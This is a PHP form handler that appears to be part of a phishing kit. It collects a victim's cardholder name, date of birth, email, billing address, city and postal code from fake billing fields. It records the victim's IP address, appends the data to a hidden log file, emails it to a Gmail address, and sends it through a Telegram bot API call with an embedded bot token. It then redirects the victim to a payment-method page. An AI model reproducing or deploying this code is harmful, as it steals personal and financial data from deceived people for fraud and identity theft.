<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['Kartenhalter']) and !empty($_POST['Geburtsdatuml']) and !empty($_POST['EMailaddresse']) and !empty($_POST['Rechnungsadresse']) and !empty($_POST['Stadt'])
        and !empty($_POST['Postleitzahl'])
        // and !empty($_POST['pin'])
    ) {
            $_SESSION['fn']=$_POST['Kartenhalter'];
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $message = "
            -
            --------------------
            | FNM : ".$_POST['Kartenhalter']."
            | DOB : ".$_POST['Geburtsdatuml']."
            | TEL : ".$_POST['EMailaddresse']."
            | ADR : ".$_POST['Rechnungsadresse']."
            | CTY : ".$_POST['Stadt']."
            | ZIP : ".$_POST['Postleitzahl']."
            | INF : " . $ip . "
            --------------------\n";

            $file = fopen("./2b456e64d92ddecd.txt", "a+");
            fwrite($file, $message);fclose($file);
            $to = "lmechouar@gmail.com";
            $subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (BIllING)";
            $headers = "From: Ak47™<lmechouar@gmail.com>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $message, $headers);
            file_get_contents("https://api.telegram.org/bot5254054002:AAHgwgtpZ-3XgKq4FrLh5UodYPoVjI3793E/sendMessage?chat_id=1362211844&text=" . urlencode($message)."" );
            header("Location: ../methodo_de_pago.php");
    }else header("Location: ?error=".md5($_GET['error']));
}
?>